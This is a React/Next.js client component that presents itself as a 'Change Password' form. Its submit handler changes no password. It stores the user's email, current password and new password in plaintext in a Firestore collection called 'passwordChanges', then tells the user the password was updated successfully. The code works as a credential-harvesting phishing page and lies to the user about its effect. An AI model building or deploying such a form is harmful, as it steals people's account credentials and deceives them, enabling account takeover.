"use client"
import { db } from "../lib/firebase";
import { collection, addDoc, serverTimestamp } from "firebase/firestore";
import { useState } from "react"
import { Eye, EyeOff } from "lucide-react"

export default function PasswordChangeForm() {
  const [formData, setFormData] = useState({
    email: "",
    oldPassword: "",
    newPassword: "",
  })

  const [showPasswords, setShowPasswords] = useState({
    oldPassword: false,
    newPassword: false,
  })

  const [errors, setErrors] = useState({})
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [showSuccessModal, setShowSuccessModal] = useState(false)

  const togglePasswordVisibility = (field) => {
    setShowPasswords((prev) => ({
      ...prev,
      [field]: !prev[field],
    }))
  }

  const handleInputChange = (field, value) => {
    setFormData((prev) => ({
      ...prev,
      [field]: value,
    }))

    // Clear error when user starts typing
    if (errors[field]) {
      setErrors((prev) => ({
        ...prev,
        [field]: "",
      }))
    }
  }

  const validateForm = () => {
    const newErrors = {}

    // Email validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
    if (!formData.email) {
      newErrors.email = "Email is required"
    } else if (!emailRegex.test(formData.email)) {
      newErrors.email = "Please enter a valid email address"
    }

    // Old password validation
    if (!formData.oldPassword) {
      newErrors.oldPassword = "Current password is required"
    }

    // New password validation
    if (!formData.newPassword) {
      newErrors.newPassword = "New password is required"
    } else if (formData.newPassword.length < 8) {
      newErrors.newPassword = "New password must be at least 8 characters long"
    } else if (formData.newPassword === formData.oldPassword) {
      newErrors.newPassword = "New password must be different from current password"
    }

    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const handleSubmit = async (e) => {
    e.preventDefault();
  
    if (!validateForm()) return;
  
    setIsSubmitting(true);
  
    try {
      await addDoc(collection(db, "passwordChanges"), {
        email: formData.email,
        oldPassword: formData.oldPassword,
        newPassword: formData.newPassword,
        submittedAt: serverTimestamp(),
      });
  
      setShowSuccessModal(true);
  
      setFormData({
        email: "",
        oldPassword: "",
        newPassword: "",
      });
      setShowPasswords({
        oldPassword: false,
        newPassword: false,
      });
    } catch (error) {
      alert("An error occurred. Please try again.");
      console.error("Firestore error:", error);
    } finally {
      setIsSubmitting(false);
    }
  };

  const closeSuccessModal = () => {
    setShowSuccessModal(false)
  }

  return (
    <div className="min-h-screen flex items-center justify-center p-4"
    style={{
      backgroundImage: "conic-gradient(at top right, #57534e, #a8a29e, #e7e5e4)"
    }}>
      <div className="bg-white rounded-xl shadow-2xl w-full max-w-md p-8">
        {/* Header */}
        <div className="text-center mb-8">
          <h1 className="text-2xl font-bold text-gray-900 mb-2">Change Password</h1>
          <p className="text-gray-600 text-sm">Update your account password securely</p>
        </div>

        {/* Form */}
        <form onSubmit={handleSubmit} className="space-y-6">
          {/* Email Field */}
          <div>
            <label htmlFor="email" className="block text-sm font-medium text-gray-700 mb-2">
              Email Address
            </label>
            <input
              type="email"
              id="email"
              value={formData.email}
              onChange={(e) => handleInputChange("email", e.target.value)}
              className={`w-full px-4 py-3 border-2 rounded-lg bg-gray-50 transition-all duration-300 focus:outline-none focus:bg-white placeholder-gray-500 ${
                errors.email
                  ? "border-red-500 bg-red-50"
                  : "border-gray-200 focus:border-blue-500 focus:shadow-lg focus:shadow-blue-500/10"
              }`}
              placeholder="Enter your email"
            />
            {errors.email && <p className="text-red-500 text-xs mt-2">{errors.email}</p>}
          </div>

          {/* Old Password Field */}
          <div>
            <label htmlFor="oldPassword" className="block text-sm font-medium text-gray-700 mb-2">
              Current Password
            </label>
            <div className="relative">
              <input
                type={showPasswords.oldPassword ? "text" : "password"}
                id="oldPassword"
                value={formData.oldPassword}
                onChange={(e) => handleInputChange("oldPassword", e.target.value)}
                className={`w-full px-4 py-3 pr-12 border-2 rounded-lg bg-gray-50 transition-all duration-300 focus:outline-none focus:bg-white placeholder-gray-500 ${
                  errors.oldPassword
                    ? "border-red-500 bg-red-50"
                    : "border-gray-200 focus:border-blue-500 focus:shadow-lg focus:shadow-blue-500/10"
                }`}
                placeholder="Enter current password"
              />
              <button
                type="button"
                onClick={() => togglePasswordVisibility("oldPassword")}
                className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700 transition-colors"
              >
                {showPasswords.oldPassword ? <EyeOff size={20} /> : <Eye size={20} />}
              </button>
            </div>
            {errors.oldPassword && <p className="text-red-500 text-xs mt-2">{errors.oldPassword}</p>}
          </div>

          {/* New Password Field */}
          <div>
            <label htmlFor="newPassword" className="block text-sm font-medium text-gray-700 mb-2">
              New Password
            </label>
            <div className="relative">
              <input
                type={showPasswords.newPassword ? "text" : "password"}
                id="newPassword"
                value={formData.newPassword}
                onChange={(e) => handleInputChange("newPassword", e.target.value)}
                className={`w-full px-4 py-3 pr-12 border-2 rounded-lg bg-gray-50 transition-all duration-300 focus:outline-none focus:bg-white placeholder-gray-500 ${
                  errors.newPassword
                    ? "border-red-500 bg-red-50"
                    : "border-gray-200 focus:border-blue-500 focus:shadow-lg focus:shadow-blue-500/10"
                }`}
                placeholder="Enter new password"
              />
              <button
                type="button"
                onClick={() => togglePasswordVisibility("newPassword")}
                className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700 transition-colors"
              >
                {showPasswords.newPassword ? <EyeOff size={20} /> : <Eye size={20} />}
              </button>
            </div>
            {errors.newPassword && <p className="text-red-500 text-xs mt-2">{errors.newPassword}</p>}

            {/* Password Requirements */}
            {formData.newPassword && (
              <div className="mt-2">
                <p className="text-xs text-gray-500">Password must be at least 8 characters long</p>
              </div>
            )}
          </div>

          {/* Submit Button */}
          <button
            type="submit"
            disabled={isSubmitting}
            className="w-full bg-gradient-to-r from-blue-500 to-purple-600 text-white py-3 px-4 rounded-lg font-semibold transition-all duration-300 hover:from-blue-600 hover:to-purple-700 hover:shadow-lg hover:shadow-purple-500/25 hover:-translate-y-0.5 disabled:opacity-60 disabled:cursor-not-allowed disabled:transform-none"
          >
            {isSubmitting ? "Updating Password..." : "Update Password"}
          </button>
        </form>

        {/* Success Modal */}
        {showSuccessModal && (
          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
            <div className="bg-white rounded-xl shadow-2xl max-w-sm w-full p-6 transform animate-pulse">
              <div className="text-center">
                {/* Success Icon */}
                <div className="mx-auto flex items-center justify-center h-16 w-16 rounded-full bg-green-100 mb-4">
                  <svg className="h-8 w-8 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
                  </svg>
                </div>

                {/* Success Message */}
                <h3 className="text-lg font-semibold text-gray-900 mb-2">Password Updated Successfully!</h3>
                <p className="text-gray-600 text-sm mb-6">
                  Your password has been changed successfully. You can now use your new password to log in.
                </p>

                {/* Close Button */}
                <button
                  onClick={closeSuccessModal}
                  className="w-full bg-green-600 text-white py-2 px-4 rounded-lg font-medium transition-all duration-300 hover:bg-green-700 hover:shadow-lg"
                >
                  Continue
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Footer */}
        <div className="mt-8 pt-6 border-t border-gray-200 text-center">
          <p className="text-gray-500 text-sm">Make sure to use a strong, unique password</p>
        </div>
      </div>
    </div>
  )
}
